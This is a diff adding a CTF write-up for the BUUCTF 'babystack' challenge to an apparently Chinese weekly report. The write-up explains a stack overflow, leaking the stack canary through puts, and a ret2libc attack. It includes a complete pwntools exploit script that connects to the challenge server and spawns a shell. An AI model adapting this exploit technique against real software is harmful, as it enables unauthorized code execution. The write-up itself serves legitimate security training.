@@ -209,3 +209,111 @@ s(payload)
 shell()
 ```
 
+## BUUCTF-others_babystack
+开启了canary保护
+
+<img width="677" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/72d74272-977d-44a8-af06-e60bfc8470f7">
+
+main函数
+
+<img width="376" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/59445af6-8802-4add-9e80-0feed214b136">
+
+可以看到case1存在一个栈溢出 字符串s的大小为0x80 但read可以读入0x100 但是由于栈上存在canary 所以无法之间覆盖返回地址
+
+观察到case2是输出s的值 而canary的低8位必定是0，所以可以考虑通过覆盖最后canary的最后一位后 用case2的puts函数泄漏canary
+
+泄漏canary后 我们便能劫持返回地址 但本题没有给出system的地址 所以通过leak libc去ret2libc
+
+### exp_babystack.py
+```python
+from pwn import *
+from LibcSearcher import *
+p = process("./babystack")
+p = remote("node4.buuoj.cn",29589)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+pop_rdi_ret = 0x0000000000400a93
+
+menu_main = 0x000000000400908
+puts_got = 0x000000000600fa8
+put_plt = 0x400690
+
+off_puts = 0x6f6a0
+off_system = 0x453a0
+off_binsh = 0x18ce57
+
+offset = 0x90 - 8
+
+# 1.leak canary 
+payload = b'A' * (offset - 8) + b'B' * 8
+ru(">> ")
+sl('1')
+raw_input("Ther")
+sl(payload)
+
+ru(">> ")
+sl('2')
+
+ru('BBBBBBBB')
+canary = u64(rx(8)) - 0x0a
+success("canary ==> {}".format(hex(canary)))
+
+# 2.leak libc
+payload = b'A' * offset + p64(canary)
+payload+= p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(puts_got) + p64(put_plt) + p64(menu_main)
+
+ru(">> ")
+sl('1')
+
+sl(payload)
+
+ru(">> ")
+sl('3')
+
+libc_puts = u64(rx(6).ljust(8, '\x00'))
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc = LibcSearcher("puts", libc_puts)
+libc_base = libc_puts - libc.dump("puts")
+
+# libc_base =libc_puts - off_puts
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_system = libc_base + libc.dump('system')
+success("libc_system ==> {}".format(hex(libc_system)))
+
+libc_binsh = libc_base + libc.dump('str_bin_sh')
+success("libc_binsh ==> {}".format(hex(libc_binsh)))
+
+# 3.ret2libc
+payload = b'A' * (offset) + p64(canary)
+payload+= p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)
+
+ru(">> ")
+sl('1')
+
+sl(payload)
+
+ru(">> ")
+sl('3')
+
+shell()
+```
+
+
+
+
+
+
